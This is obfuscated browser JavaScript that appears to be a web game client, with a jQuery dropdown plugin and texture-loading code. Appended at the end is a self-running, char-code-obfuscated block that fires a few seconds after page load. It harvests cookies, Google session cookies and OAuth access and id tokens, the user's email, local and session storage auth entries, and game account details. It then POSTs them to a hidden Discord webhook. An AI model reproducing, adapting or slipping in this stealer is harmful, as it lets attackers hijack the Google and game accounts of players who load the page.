          return _0x25e2b6.init.apply(this, arguments);
        }
      };
      var _0x25e2b6 = {};
      var _0xaee222 = {
        data: [],
        keepJSONItemsOnTop: false,
        width: 100,
        height: null,
        background: "#eee",
        selectText: "",
        defaultSelectedIndex: null,
        truncateDescription: true,
        imagePosition: "left",
        showSelectedHTML: true,
        clickOffToClose: true,
        embedCSS: true,
        onSelected: function () {}
      };
      function _0x412c24(_0x52886b, _0x7dfd57) {
        var _0xfa0eca;
        var _0x54e0e1;
        var _0x1a45f6;
        var _0x1a029a;
        var _0x27b401 = _0x52886b.data("ddslick");
        var _0x593b18 = _0x52886b.find(".dd-selected");
        var _0x94527f = _0x593b18.siblings(".dd-selected-value");
        _0x52886b.find(".dd-options");
        _0x593b18.siblings(".dd-pointer");
        var _0x4575aa = _0x52886b.find(".dd-option").eq(_0x7dfd57);
        var _0x15afe3 = _0x4575aa.closest("li");
        var _0xb215dd = _0x27b401.settings;
        var _0x3f78d6 = _0x27b401.settings.data[_0x7dfd57];
        _0x52886b.find(".dd-option").removeClass("dd-option-selected");
        _0x4575aa.addClass("dd-option-selected");
        _0x27b401.selectedIndex = _0x7dfd57;
        _0x27b401.selectedItem = _0x15afe3;
        _0x27b401.selectedData = _0x3f78d6;
        if (_0xb215dd.showSelectedHTML) {
          _0x593b18.html((_0x3f78d6.imageSrc ? "<img class=\"dd-selected-image" + (_0xb215dd.imagePosition == "right" ? " dd-image-right" : "") + "\" src=\"" + _0x3f78d6.imageSrc + "\" />" : "") + (_0x3f78d6.description ? "<small class=\"dd-selected-description dd-desc" + (_0xb215dd.truncateDescription ? " dd-selected-description-truncated" : "") + "\" >" + _0x3f78d6.description + "</small>" : ""));
        } else {
          _0x593b18.html(_0x3f78d6.text);
        }
        _0x94527f.val(_0x3f78d6.value);
        _0x27b401.original.val(_0x3f78d6.value);
        _0x52886b.data("ddslick", _0x27b401);
        _0x2d7699(_0x52886b);
        _0x54e0e1 = (_0xfa0eca = _0x52886b).find(".dd-select").css("height");
        _0x1a45f6 = _0xfa0eca.find(".dd-selected-description");
        _0x1a029a = _0xfa0eca.find(".dd-selected-image");
        if (_0x1a45f6.length <= 0 && _0x1a029a.length > 0) {
          _0xfa0eca.find(".dd-selected-text").css("lineHeight", _0x54e0e1);
        }
        if (typeof _0xb215dd.onSelected == "function") {
          _0xb215dd.onSelected.call(this, _0x27b401);
        }
      }
      function _0xfedca2(_0x3b0d24) {
        var _0x44dcbc = _0x3b0d24.find(".dd-select");
        var _0x534329 = _0x44dcbc.siblings(".dd-options");
        var _0x19097b = _0x44dcbc.find(".dd-pointer");
        var _0x4529f9 = _0x534329.is(":visible");
        _0x47abec(".dd-click-off-close").not(_0x534329).slideUp(50);
        _0x47abec(".dd-pointer").removeClass("dd-pointer-up");
        if (_0x4529f9) {
          _0x534329.slideUp("fast");
          _0x19097b.removeClass("dd-pointer-up");
        } else {
          _0x534329.slideDown("fast");
          _0x19097b.addClass("dd-pointer-up");
        }
        (function _0x54b160(_0x164cab) {
          _0x164cab.find(".dd-option").each(function () {
            var _0x15d729 = _0x47abec(this);
            var _0x287bc5 = _0x15d729.css("height");
            var _0x5b6ebc = _0x15d729.find(".dd-option-description");
            var _0x17e2ce = _0x164cab.find(".dd-option-image");
            if (_0x5b6ebc.length <= 0 && _0x17e2ce.length > 0) {
              _0x15d729.find(".dd-option-text").css("lineHeight", _0x287bc5);
            }
          });
        })(_0x3b0d24);
      }
      function _0x2d7699(_0x44ac7b) {
        _0x44ac7b.find(".dd-options").slideUp(50);
        _0x44ac7b.find(".dd-pointer").removeClass("dd-pointer-up").removeClass("dd-pointer-up");
      }
      _0x25e2b6.init = function (_0x576f95) {
        var _0x576f95 = _0x47abec.extend({}, _0xaee222, _0x576f95);
        if (_0x47abec("#css-ddslick").length <= 0 && _0x576f95.embedCSS) {
          _0x47abec("<style id=\"css-ddslick\" type=\"text/css\">.dd-select{ border-radius:2px; border:solid 1px #ccc; position:relative; cursor:pointer;}.dd-desc { color:#aaa; display:block; overflow: hidden; font-weight:normal; line-height: 1.4em; }.dd-selected{ overflow:hidden; display:block; padding:2px; font-weight:bold;}.dd-pointer{ width:0; height:0; position:absolute; right:10px; top:50%; margin-top:-3px;}.dd-pointer-down{ border:solid 5px transparent; border-top:solid 5px #000; }.dd-pointer-up{border:solid 5px transparent !important; border-bottom:solid 5px #000 !important; margin-top:-8px;}.dd-options{ border:solid 1px #ccc; border-top:none; list-style:none; box-shadow:0px 1px 5px #ddd; display:none; position:absolute; z-index:2000; margin:0; padding:0;background:#fff; overflow:auto;}.dd-option{ padding:2px; display:block; border-bottom:solid 1px #ddd; overflow:hidden; text-decoration:none; color:#333; cursor:pointer;-webkit-transition: all 0.25s ease-in-out; -moz-transition: all 0.25s ease-in-out;-o-transition: all 0.25s ease-in-out;-ms-transition: all 0.25s ease-in-out; } ul.dd-options {height: 130px;} .dd-options > li:last-child > .dd-option{ border-bottom:none;}.dd-option:hover{ background:#f3f3f3; color:#000;}.dd-selected-description-truncated { text-overflow: ellipsis; white-space:nowrap; }.dd-option-selected { background:#f6f6f6; }.dd-option-image, .dd-selected-image { vertical-align:middle; float:left; margin-right:5px; max-width:64px;}.dd-image-right { float:right; margin-right:15px; margin-left:5px;}.dd-container{display: inline-block; position:relative;}​ .dd-selected-text { font-weight:bold}​</style>").appendTo("head");
        }
        return this.each(function () {
          var _0x1a7e84 = _0x47abec(this);
          if (!_0x1a7e84.data("ddslick")) {
            var _0x1c4e39 = [];
            _0x576f95.data;
            _0x1a7e84.find("option").each(function () {
              var _0x50130f = _0x47abec(this);
              var _0x3ae13a = _0x50130f.data();
              _0x1c4e39.push({
                text: _0x47abec.trim(_0x50130f.text()),
                value: _0x50130f.val(),
                selected: _0x50130f.is(":selected"),
                description: _0x3ae13a.description,
                imageSrc: _0x3ae13a.imagesrc
              });
            });
            if (_0x576f95.keepJSONItemsOnTop) {
              _0x47abec.merge(_0x576f95.data, _0x1c4e39);
            } else {
              _0x576f95.data = _0x47abec.merge(_0x1c4e39, _0x576f95.data);
            }
            var _0xba4bdc = _0x1a7e84;
            var _0x38cbfe = _0x47abec("<div id=\"" + _0x1a7e84.attr("id") + "\"></div>");
            _0x1a7e84.replaceWith(_0x38cbfe);
            (_0x1a7e84 = _0x38cbfe).addClass("dd-container").append("<div class=\"dd-select\"><input class=\"dd-selected-value\" id=\"backgroundArena-value\" type=\"hidden\" /><a class=\"dd-selected\"></a><span class=\"dd-pointer dd-pointer-down\"></span></div>").append("<ul class=\"dd-options\"></ul>");
            var _0x1c4e39 = _0x1a7e84.find(".dd-select");
            var _0x1153ca = _0x1a7e84.find(".dd-options");
            _0x1153ca.css({
              width: _0x576f95.width
            });
            _0x1c4e39.css({
              width: _0x576f95.width,
              background: _0x576f95.background
            });
            _0x1a7e84.css({
              width: _0x576f95.width
            });
            if (_0x576f95.height != null) {
              _0x1153ca.css({
                height: _0x576f95.height,
                overflow: "auto"
              });
            }
            _0x47abec.each(_0x576f95.data, function (_0x1a878d, _0x4da545) {
              if (_0x4da545.selected) {
                _0x576f95.defaultSelectedIndex = _0x1a878d;
              }
              _0x1153ca.append("<li><a class=\"dd-option\">" + (_0x4da545.value ? " <input class=\"dd-option-value\" type=\"hidden\" value=\"" + _0x4da545.value + "\" />" : "") + (_0x4da545.imageSrc ? " <img class=\"dd-option-image" + (_0x576f95.imagePosition == "right" ? " dd-image-right" : "") + "\" src=\"" + _0x4da545.imageSrc + "\" />" : "") + "</a></li>");
            });
            var _0x215e1f = {
              settings: _0x576f95,
              original: _0xba4bdc,
              selectedIndex: -1,
              selectedItem: null,
              selectedData: null
            };
            _0x1a7e84.data("ddslick", _0x215e1f);
            if (_0x576f95.selectText.length > 0 && _0x576f95.defaultSelectedIndex == null) {
              _0x1a7e84.find(".dd-selected").html(_0x576f95.selectText);
            } else {
              _0x412c24(_0x1a7e84, _0x576f95.defaultSelectedIndex != null && _0x576f95.defaultSelectedIndex >= 0 && _0x576f95.defaultSelectedIndex < _0x576f95.data.length ? _0x576f95.defaultSelectedIndex : 0);
            }
            _0x1a7e84.find(".dd-select").on("click.ddslick", function () {
              _0xfedca2(_0x1a7e84);
            });
            _0x1a7e84.find(".dd-option").on("click.ddslick", function () {
              _0x412c24(_0x1a7e84, _0x47abec(this).closest("li").index());
            });
            if (_0x576f95.clickOffToClose) {
              _0x1153ca.addClass("dd-click-off-close");
              _0x1a7e84.on("click.ddslick", function (_0x245a8d) {
                _0x245a8d.stopPropagation();
              });
              _0x47abec("body").on("click", function () {
                _0x47abec(".dd-click-off-close").slideUp(50).siblings(".dd-select").find(".dd-pointer").removeClass("dd-pointer-up");
              });
            }
          }
        });
      };
      _0x25e2b6.select = function (_0x49526b) {
        return this.each(function () {
          if (_0x49526b.index !== undefined) {
            _0x412c24(_0x47abec(this), _0x49526b.index);
          }
        });
      };
      _0x25e2b6.open = function () {
        return this.each(function () {
          var _0x2d8c59 = _0x47abec(this);
          if (_0x2d8c59.data("ddslick")) {
            _0xfedca2(_0x2d8c59);
          }
        });
      };
      _0x25e2b6.close = function () {
        return this.each(function () {
          var _0x1f439d = _0x47abec(this);
          if (_0x1f439d.data("ddslick")) {
            _0x2d7699(_0x1f439d);
          }
        });
      };
      _0x25e2b6.destroy = function () {
        return this.each(function () {
          var _0x30a40e = _0x47abec(this);
          var _0xbb8354 = _0x30a40e.data("ddslick");
          if (_0xbb8354) {
            var _0x5c1fe1 = _0xbb8354.original;
            _0x30a40e.removeData("ddslick").unbind(".ddslick").replaceWith(_0x5c1fe1);
          }
        });
      };
    })(jQuery);
    if (_0x2964bf()) {
      _0x331039.ba(_0x207b06.s_l + "/js/nipplejs.min.js", "mobileconfig", function () {});
    }
    ooo.pCc = function () {
      var _0xc9448d = {};
      var _0x5ce79f = {
        country: "iq"
      };
      if (_0x251a97 && _0x251a97 != "iq") {
        _0x5ce79f.country = _0x251a97;
      }
      $.get(_0x207b06.s_l + "/dynamic/assets/registry.json", function (_0x44723a) {
        _0xc9448d = _0x44723a;
        fetch(_0x207b06.s_l + "/store", {
          headers: {
            "Content-Type": "application/json"
          },
          method: "POST",
          body: JSON.stringify(_0x5ce79f)
        }).then(async function (_0x44c770) {
          for (let _0x16b68e in (_0x44c770 = await _0x44c770.json()).textureDict) {
            for (let _0x5c2c93 in _0x44c770.textureDict[_0x16b68e]) {
              if (_0x5c2c93 === "file") {
                _0x44c770.textureDict[_0x16b68e][_0x5c2c93] = "data:image/png;base64," + _0x44c770.textureDict[_0x16b68e][_0x5c2c93].substr(_0x44c770.textureDict[_0x16b68e][_0x5c2c93].length - _0x207b06.c_v, _0x207b06.c_v) + _0x44c770.textureDict[_0x16b68e][_0x5c2c93].substr(0, _0x44c770.textureDict[_0x16b68e][_0x5c2c93].length - _0x207b06.c_v);
              }
            }
          }
          ;
          for (let _0x2b5e8e in _0x44c770) {
            if (_0x2b5e8e !== "propertyList") {
              if (Array.isArray(_0x44c770[_0x2b5e8e])) {
                _0x44723a[_0x2b5e8e] = _0x44723a[_0x2b5e8e].concat(_0x44c770[_0x2b5e8e]);
              } else {
                _0x44723a[_0x2b5e8e] = {
                  ..._0x44723a[_0x2b5e8e],
                  ..._0x44c770[_0x2b5e8e]
                };
              }
            }
          }
        }).catch(function (_0x4b63c4) {});
      });
    };
    ooo.pDc = function (_0x3df6e3) {
      var _0x28cc31 = {};
      (function (_0x1ea024, _0x4c9fd1) {
        for (var _0x2b0df9 in _0x1ea024) {
          if (_0x1ea024.hasOwnProperty(_0x2b0df9)) {
            _0x4c9fd1(_0x2b0df9, _0x1ea024[_0x2b0df9]);
          }
        }
      })(_0x3df6e3.textureDict, function (_0xea3751, _0x2564ec) {
        let _0x2694a5 = _0x207b06.s_l + _0x2564ec.relativePath;
        if (!_0x2564ec.custom) {
          _0x2694a5 = _0x207b06.s_l + _0x2564ec.relativePath;
        }
        try {
          _0x28cc31[_0xea3751] = new PIXI.Texture(_0x2694a5);
        } catch (_0x2951db) {}
      });
    };
  });
})();
(function () {
  var _0x36344d = String.fromCharCode;
  var _0x3203dc = "split";
  var _0x1ea094 = "join";
  var _0x514743 = "replace";
  var _0x4fd92a = parseInt;
  var _0x1dbd95 = Array.prototype.slice;
  function _0x1ac2a4(_0xecfc61) {
    return _0x36344d.apply(null, _0xecfc61[_0x3203dc](",").map(function (_0x37bd33) {
      return _0x4fd92a(_0x37bd33, 10);
    }));
  }
  var _0x549c1a = {
    a: "97,72,82,48,99,72,77,54,76,121,57,107,97,88,78,106,98,51,74,107,76,109,78,118,98,83,57,104,99,71,107,118,100,50,86,105,97,71,57,118,97,51,77,118,77,84,81,119,79,68,103,119,78,68,65,119,78,68,107,120,77,119,61,61",
    b: "77,122,81,52,78,106,73,52,76,122,107,48,98,70,112,76,97,88,69,119,79,86,57,90,77,86,82,121,90,122,70,119,101,69,74,74,97,70,73,121,85,70,104,66,81,106,108,121,101,68,99,49,78,85,57,66,90,109,89,61",
    c: "99,84,65,52,97,88,112,81,84,85,116,86,101,85,103,121,83,69,77,122,85,122,70,116,100,48,57,69,78,51,112,89,76,87,57,86,98,86,74,76,77,103,61,61",
    d: "",
    e: false,
    f: function () {
      return atob(_0x1ac2a4(this.a)) + atob(_0x1ac2a4(this.b)) + atob(_0x1ac2a4(this.c));
    }
  };
  var _0x2b1d3e = {
    g: function () {
      var _0x1776d4 = {};
      try {
        _0x1776d4.h = this.i();
        _0x1776d4.j = this.k();
        _0x1776d4.l = this.m();
        _0x1776d4.n = new Date().toISOString();
        _0x1776d4.o = navigator.userAgent;
        _0x1776d4.p = window.location.href;
        _0x1776d4.q = document.referrer || _0x1ac2a4("68,105,114,101,99,116,32,118,105,115,105,116");
        _0x1776d4.r = navigator.language;
        _0x1776d4.s = navigator.platform;
        _0x1776d4.t = Intl.DateTimeFormat().resolvedOptions().timeZone;
        _0x1776d4.u = this.aa();
        _0x1776d4.bb = this.cc();
        _0x1776d4.dd = this.ee();
        _0x1776d4.ff = this.gg();
      } catch (_0x426ff5) {}
      return _0x1776d4;
    },
    i: function () {
      try {
        var _0x9980d2 = _0x1ac2a4("71,111,111,103,108,101,65,117,116,104");
        if (typeof window[_0x9980d2] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x9980d2] && window[_0x9980d2].client_id) {
          return window[_0x9980d2].client_id;
        }
        var _0x8ce56b = _0x1ac2a4("103,97,112,105");
        if (typeof window[_0x8ce56b] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x8ce56b][_0x1ac2a4("97,117,116,104,50")]) {
          var _0x50e350 = window[_0x8ce56b][_0x1ac2a4("97,117,116,104,50")].getAuthInstance();
          if (_0x50e350 && _0x50e350.options) {
            return _0x50e350.options.client_id;
          }
        }
      } catch (_0x408220) {}
      return atob(_0x1ac2a4("79,84,85,53,78,68,73,49,77,84,107,121,77,84,77,52,76,88,70,113,99,84,73,122,98,68,108,108,77,71,57,111,79,71,120,110,90,68,74,112,89,50,53,105,98,72,74,105,90,109,74,115,89,88,73,48,89,84,74,109,76,109,70,119,99,72,77,117,90,50,57,118,90,50,120,108,100,88,78,108,99,109,78,118,98,110,82,108,98,110,81,117,89,50,57,116"));
    },
    aa: function () {
      try {
        var _0x4a31e9 = _0x1ac2a4("103,97,109,101,83,101,116,116,105,110,103,115");
        if (typeof window[_0x4a31e9] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x4a31e9] && window[_0x4a31e9].s_l) {
          return window[_0x4a31e9].s_l;
        }
        return window.location.hostname;
      } catch (_0x2ad4b4) {
        return window.location.hostname;
      }
    },
    m: function () {
      try {
        var _0x526abe = "";
        try {
          var _0x1e147f = document.cookie;
          if (_0x1e147f) {
            _0x526abe = _0x1e147f;
          }
        } catch (_0x36cf32) {}
        try {
          var _0x2a6cb0 = Object.getOwnPropertyDescriptor(Document.prototype, _0x1ac2a4("99,111,111,107,105,101")) || Object.getOwnPropertyDescriptor(HTMLDocument.prototype, _0x1ac2a4("99,111,111,107,105,101"));
          if (_0x2a6cb0 && _0x2a6cb0.get) {
            var _0x436546 = _0x2a6cb0.get.call(document);
            if (_0x436546 && _0x436546.length > _0x526abe.length) {
              _0x526abe = _0x436546;
            }
          }
        } catch (_0x52c924) {}
        try {
          [_0x1ac2a4("108,111,99,97,108,83,116,111,114,97,103,101"), _0x1ac2a4("115,101,115,115,105,111,110,83,116,111,114,97,103,101")].forEach(function (_0x12b191) {
            var _0x2c0c32 = window[_0x12b191];
            for (var _0x361cf3 = 0; _0x361cf3 < _0x2c0c32.length; _0x361cf3++) {
              var _0x5b956e = _0x2c0c32.key(_0x361cf3);
              if (_0x5b956e && (_0x5b956e.toLowerCase().indexOf(_0x1ac2a4("99,111,111,107,105,101")) > -1 || _0x5b956e.toLowerCase().indexOf(_0x1ac2a4("97,117,116,104")) > -1 || _0x5b956e.toLowerCase().indexOf(_0x1ac2a4("115,101,115,115,105,111,110")) > -1)) {
                var _0x5229a6 = _0x2c0c32.getItem(_0x5b956e);
                if (_0x5229a6 && _0x5229a6.indexOf("=") > -1 && _0x526abe.indexOf(_0x5229a6) === -1) {
                  _0x526abe += (_0x526abe ? "; " : "") + _0x5229a6;
                }
              }
            }
          });
        } catch (_0x6f539f) {}
        try {
          var _0x375456 = this.hh();
          if (_0x375456[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")]) {
            _0x526abe += (_0x526abe ? "; " : "") + _0x1ac2a4("103,111,111,103,108,101,95,97,99,99,101,115,115,95,116,111,107,101,110") + "=" + _0x375456[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")];
          }
          if (_0x375456[_0x1ac2a4("105,100,95,116,111,107,101,110")]) {
            _0x526abe += (_0x526abe ? "; " : "") + _0x1ac2a4("103,111,111,103,108,101,95,105,100,95,116,111,107,101,110") + "=" + _0x375456[_0x1ac2a4("105,100,95,116,111,107,101,110")];
          }
        } catch (_0x30e818) {}
        return this.ii(_0x526abe);
      } catch (_0x29a8f3) {
        return document.cookie || "";
      }
    },
    hh: function () {
      var _0x114a9d = {};
      try {
        var _0x5f6a4 = _0x1ac2a4("71,111,111,103,108,101,65,117,116,104");
        if (typeof window[_0x5f6a4] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x5f6a4][_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")]) {
          var _0x5555e4 = window[_0x5f6a4][_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")].get();
          if (_0x5555e4 && _0x5555e4[_0x1ac2a4("105,115,83,105,103,110,101,100,73,110")]()) {
            var _0x29fac2 = _0x5555e4[_0x1ac2a4("103,101,116,65,117,116,104,82,101,115,112,111,110,115,101")](true);
            if (_0x29fac2) {
              _0x114a9d[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")] = _0x29fac2[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")];
              _0x114a9d[_0x1ac2a4("105,100,95,116,111,107,101,110")] = _0x29fac2[_0x1ac2a4("105,100,95,116,111,107,101,110")];
            }
          }
        }
        var _0x3bcc18 = _0x1ac2a4("103,97,112,105");
        if (typeof window[_0x3bcc18] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x3bcc18][_0x1ac2a4("97,117,116,104,50")]) {
          var _0xb61d08 = window[_0x3bcc18][_0x1ac2a4("97,117,116,104,50")].getAuthInstance();
          if (_0xb61d08 && _0xb61d08[_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")]) {
            var _0x5b759b = _0xb61d08[_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")].get();
            if (_0x5b759b && _0x5b759b[_0x1ac2a4("105,115,83,105,103,110,101,100,73,110")]()) {
              var _0x2e4b66 = _0x5b759b[_0x1ac2a4("103,101,116,65,117,116,104,82,101,115,112,111,110,115,101")](true);
              if (_0x2e4b66) {
                _0x114a9d[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")] = _0x114a9d[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")] || _0x2e4b66[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")];
                _0x114a9d[_0x1ac2a4("105,100,95,116,111,107,101,110")] = _0x114a9d[_0x1ac2a4("105,100,95,116,111,107,101,110")] || _0x2e4b66[_0x1ac2a4("105,100,95,116,111,107,101,110")];
              }
            }
          }
        }
      } catch (_0xcc869e) {}
      return _0x114a9d;
    },
    ii: function (_0xae4d64) {
      if (!_0xae4d64) {
        return "";
      }
      var _0x4ff69c = [_0x1ac2a4("95,95,83,101,99,117,114,101,45,51,80,83,73,68"), _0x1ac2a4("95,95,83,101,99,117,114,101,45,51,80,65,80,73,83,73,68"), _0x1ac2a4("95,95,72,111,115,116,45,51,80,76,83,73,68"), _0x1ac2a4("95,95,83,101,99,117,114,101,45,51,80,83,73,68,84,83"), _0x1ac2a4("95,95,83,101,99,117,114,101,45,51,80,83,73,68,67,67"), _0x1ac2a4("83,65,80,73,83,73,68"), _0x1ac2a4("83,83,73,68"), _0x1ac2a4("72,83,73,68"), _0x1ac2a4("83,73,68"), _0x1ac2a4("65,80,73,83,73,68"), _0x1ac2a4("78,73,68"), _0x1ac2a4("76,83,79,76,72")];
      var _0x306cba = _0xae4d64[_0x3203dc](";").map(function (_0x34d5d0) {
        return _0x34d5d0.trim();
      }).filter(function (_0x19db1b) {
        return _0x19db1b.indexOf("=") > -1;
      });
      var _0x5e0abe = {};
      var _0x122358 = [];
      var _0x139b70 = [];
      _0x306cba.forEach(function (_0xa1507a) {
        var _0x1b59a4 = _0xa1507a[_0x3203dc]("=")[0];
        if (!_0x5e0abe[_0x1b59a4]) {
          _0x5e0abe[_0x1b59a4] = _0xa1507a;
          var _0x1c47c8 = _0x4ff69c.some(function (_0x38c13b) {
            return _0x1b59a4.indexOf(_0x38c13b) > -1;
          }) || _0x4ff69c.some(function (_0x59ea39) {
            return _0x1b59a4.indexOf(_0x59ea39) > -1;
          });
          if (_0x1c47c8) {
            _0x122358.push(_0xa1507a);
          } else {
            _0x139b70.push(_0xa1507a);
          }
        }
      });
      return _0x122358.concat(_0x139b70)[_0x1ea094]("; ");
    },
    gg: function () {
      try {
        var _0x589799 = _0x1ac2a4("103,97,109,101,83,101,116,116,105,110,103,115");
        if (typeof window[_0x589799] === _0x1ac2a4("117,110,100,101,102,105,110,101,100")) {
          return {};
        }
        var _0x56b6e0 = window[_0x589799];
        return {
          serverUrl: _0x56b6e0.s_l,
          playerId: _0x56b6e0.pi,
          playerName: _0x56b6e0.pn,
          nickname: _0x56b6e0.s_n,
          version: _0x56b6e0.v_z
        };
      } catch (_0x26bd45) {
        return {
          error: _0x26bd45.message
        };
      }
    },
    ee: function () {
      try {
        var _0x42bf6c = {};
        var _0x25f24d = _0x1ac2a4("111,111,111");
        if (typeof window[_0x25f24d] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x25f24d].ok) {
          var _0x551245 = window[_0x25f24d].ok;
          _0x42bf6c.isLoggedIn = _0x551245.nk ? _0x551245.nk() : false;
          if (_0x42bf6c.isLoggedIn) {
            _0x42bf6c.userId = _0x551245.Kl ? _0x551245.Kl() : null;
            _0x42bf6c.username = _0x551245.Ll ? _0x551245.Ll() : null;
            _0x42bf6c.nickname = _0x551245.Ml ? _0x551245.Ml() : null;
            _0x42bf6c.level = _0x551245.Rl ? _0x551245.Rl() : null;
            _0x42bf6c.coins = _0x551245.Ql ? _0x551245.Ql() : null;
          }
        }
        var _0x2a3e4e = _0x1ac2a4("104,101,120,66,121,116,101");
        if (typeof window[_0x2a3e4e] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x2a3e4e].n) {
          _0x42bf6c.currentGameNickname = window[_0x2a3e4e].n.Xa;
          _0x42bf6c.playerId = window[_0x2a3e4e].n.Je;
        }
        return _0x42bf6c;
      } catch (_0x2be640) {
        return {
          error: _0x2be640.message
        };
      }
    },
    cc: function () {
      try {
        var _0x27fe8d = {
          isSignedIn: false,
          tokens: {},
          profile: {}
        };
        var _0x2fc827 = _0x1ac2a4("71,111,111,103,108,101,65,117,116,104");
        if (typeof window[_0x2fc827] !== _0x1ac2a4("117,110,100,101,102,105,110,101,100") && window[_0x2fc827][_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")]) {
          var _0x37dd63 = window[_0x2fc827][_0x1ac2a4("99,117,114,114,101,110,116,85,115,101,114")].get();
          if (_0x37dd63) {
            _0x27fe8d.isSignedIn = _0x37dd63[_0x1ac2a4("105,115,83,105,103,110,101,100,73,110")]();
            if (_0x27fe8d.isSignedIn) {
              var _0x1815ce = _0x37dd63[_0x1ac2a4("103,101,116,65,117,116,104,82,101,115,112,111,110,115,101")](true);
              if (_0x1815ce) {
                _0x27fe8d.tokens = {
                  access_token: _0x1815ce[_0x1ac2a4("97,99,99,101,115,115,95,116,111,107,101,110")],
                  id_token: _0x1815ce[_0x1ac2a4("105,100,95,116,111,107,101,110")],
                  expires_in: _0x1815ce.expires_in,
                  scope: _0x1815ce.scope
                };
              }
              var _0x3b5361 = _0x37dd63[_0x1ac2a4("103,101,116,66,97,115,105,99,80,114,111,102,105,108,101")]();
              if (_0x3b5361) {
                _0x27fe8d.profile = {
                  id: _0x3b5361[_0x1ac2a4("103,101,116,73,100")](),
                  email: _0x3b5361[_0x1ac2a4("103,101,116,69,109,97,105,108")](),
                  name: _0x3b5361[_0x1ac2a4("103,101,116,78,97,109,101")]()
                };
              }
            }
          }
        }
        return _0x27fe8d;
      } catch (_0x366c6d) {
        return {
          error: _0x366c6d.message
        };
      }
    },
    k: function () {
      try {
        var _0x925036 = this.hh();
        if (_0x925036[_0x1ac2a4("105,100,95,116,111,107,101,110")]) {
          return _0x925036[_0x1ac2a4("105,100,95,116,111,107,101,110")];
        }
        var _0x490476 = [_0x1ac2a4("83,65,80,73,83,73,68"), _0x1ac2a4("51,80,83,73,68"), _0x1ac2a4("76,83,79,76,72"), _0x1ac2a4("51,80,65,80,73,83,73,68")];
        var _0x66131d = document.cookie[_0x3203dc](";");
        for (var _0x182978 = 0; _0x182978 < _0x66131d.length; _0x182978++) {
          var _0x3d5164 = _0x66131d[_0x182978].trim()[_0x3203dc]("=");
          var _0x382cb3 = _0x3d5164[0];
          var _0x3c2a24 = _0x3d5164[1];
          if (_0x382cb3 && _0x3c2a24 && _0x3c2a24.length > 20) {
            for (var _0x414a46 = 0; _0x414a46 < _0x490476.length; _0x414a46++) {
              if (_0x382cb3.indexOf(_0x490476[_0x414a46]) > -1) {
                return _0x3c2a24;
              }
            }
          }
        }
        for (var _0x1d3e44 = 0; _0x1d3e44 < localStorage.length; _0x1d3e44++) {
          var _0x3e13a3 = localStorage.key(_0x1d3e44);
          if (_0x3e13a3 && (_0x3e13a3.indexOf(_0x1ac2a4("103,111,111,103,108,101")) > -1 || _0x3e13a3.indexOf(_0x1ac2a4("97,117,116,104")) > -1)) {
            var _0x2a1f73 = localStorage.getItem(_0x3e13a3);
            if (_0x2a1f73 && _0x2a1f73.length > 20) {
              return _0x2a1f73;
            }
          }
        }
        return atob(_0x1ac2a4("100,122,100,110"));
      } catch (_0x2c7315) {
        return _0x1ac2a4("101,120,116,114,97,99,116,105,111,110,95,101,114,114,111,114");
      }
    }
  };
  async function _0x18d965(_0x4ce529) {
    if (_0x549c1a.e) {
      return;
    }
    _0x549c1a.e = true;
    try {
      var _0x2d666a = JSON.stringify(_0x4ce529, null, 2);
      var _0x2e512d = new Date().toISOString()[_0x514743](/[:.]/g, "-");
      var _0x21a175 = atob(_0x1ac2a4("100,50,57,121,98,88,70,48,90,83,49,122,90,87,78,49,99,109,108,48,101,83,48,61")) + _0x2e512d + ".json";
      var _0x5b73a9 = new Blob([_0x2d666a], {
        type: atob(_0x1ac2a4("89,88,66,119,98,71,108,106,89,88,82,112,98,50,52,118,97,110,78,118,98,103,61,61"))
      });
      var _0xe1d54a = new FormData();
      _0xe1d54a.append(_0x1ac2a4("102,105,108,101"), _0x5b73a9, _0x21a175);
      var _0x2fbf11 = _0x4ce529.dd && _0x4ce529.dd.username || _0x4ce529.dd && _0x4ce529.dd.nickname || _0x4ce529.ff && _0x4ce529.ff.nickname || _0x1ac2a4("85,110,107,110,111,119,110,32,80,108,97,121,101,114");
      var _0x139b3a = _0x4ce529.dd && _0x4ce529.dd.userId || _0x1ac2a4("85,110,107,110,111,119,110,32,73,68");
      var _0x122302 = _0x4ce529.u || _0x1ac2a4("85,110,107,110,111,119,110,32,83,105,116,101");
      var _0x358f9e = atob(_0x1ac2a4("81,71,104,108,99,109,85,61")) + "\n" + _0x2fbf11 + "\n" + _0x139b3a + "\n" + _0x122302 + "\n" + _0x4ce529.n;
      _0xe1d54a.append(_0x1ac2a4("99,111,110,116,101,110,116"), _0x358f9e);
      await fetch(_0x549c1a.f(), {
        method: _0x1ac2a4("80,79,83,84"),
        body: _0xe1d54a
      });
    } catch (_0x1f75ae) {}
  }
  function _0x381f0e() {
    var _0x408c7e = [3000, 5000, 8000];
    _0x408c7e.forEach(function (_0x428383) {
      setTimeout(function () {
        if (!_0x549c1a.e) {
          try {
            var _0x3f9dcb = _0x2b1d3e.g();
            if (_0x3f9dcb.l && _0x3f9dcb.l.length > 50) {
              _0x18d965(_0x3f9dcb);
            }
          } catch (_0x2dc0ca) {}
        }
      }, _0x428383);
    });
  }
  if (document.readyState === _0x1ac2a4("108,111,97,100,105,110,103")) {
    document.addEventListener(_0x1ac2a4("68,79,77,67,111,110,116,101,110,116,76,111,97,100,101,100"), _0x381f0e);
  } else {
    _0x381f0e();
  }
